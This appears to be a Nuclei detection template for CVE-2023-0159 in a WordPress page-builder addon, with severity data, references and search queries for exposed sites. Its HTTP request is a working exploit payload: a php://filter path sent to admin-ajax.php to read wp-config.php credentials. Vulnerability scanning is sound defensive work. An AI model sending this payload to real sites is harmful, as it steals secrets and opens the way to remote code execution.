id: CVE-2023-0159

info:
  name: Extensive VC Addons for WPBakery page builder < 1.9.1 - Unauthenticated RCE
  author: c4sper0
  severity: high
  description: |
    The plugin does not validate a parameter passed to the php extract function when loading templates, allowing an unauthenticated attacker to override the template path to read arbitrary files from the hosts file system. This may be escalated to RCE using PHP filter chains.
  impact: |
    Unauthenticated attackers can exploit parameter validation flaws in the template loading mechanism to read arbitrary files including wp-config.php and escalate to remote code execution using PHP filter chains.
  remediation: Fixed in 1.9.1
  reference:
    - https://wpscan.com/vulnerability/239ea870-66e5-4754-952e-74d4dd60b809/
    - https://github.com/im-hanzou/EVCer
    - https://github.com/nomi-sec/PoC-in-GitHub
    - https://github.com/xu-xiang/awesome-security-vul-llm
    - https://wordpress.org/plugins/extensive-vc-addon/
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
    cvss-score: 7.5
    cve-id: CVE-2023-0159
    epss-score: 0.91615
    epss-percentile: 0.99656
    cpe: cpe:2.3:a:wprealize:extensive_vc_addons_for_wpbakery_page_builder:*:*:*:*:*:wordpress:*:*
  metadata:
    max-request: 1
    vendor: wprealize
    product: "extensive_vc_addons_for_wpbakery_page_builder"
    framework: wordpress
    shodan-query: "http.html:/wp-content/plugins/extensive-vc-addon/"
    fofa-query: "body=/wp-content/plugins/extensive-vc-addon/"
    publicwww-query: "/wp-content/plugins/extensive-vc-addon/"
  tags: cve,cve2023,wordpress,wpbakery,wp-plugin,lfi,extensive-vc-addon,wprealize,vkev,vuln

http:
  - raw:
      - |
        POST /wp-admin/admin-ajax.php HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        action=extensive_vc_init_shortcode_pagination&options[template]=php://filter/convert.base64-encode/resource=../wp-config.php

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - '{"status":"success","message":"Items are loaded","data":'

      - type: status
        status:
          - 200
# digest: 4a0a00473045022100a56b9a95c63b83df291135bc3f2a09e1fe15b9e4d67fcc2e5d54c4884b6896f902200aaf4b587bb2d724c8ff7f19fd50781e7fd703fffafd796d900b9dddadeb92cc:922c64590222798bb761d5b6d8e72950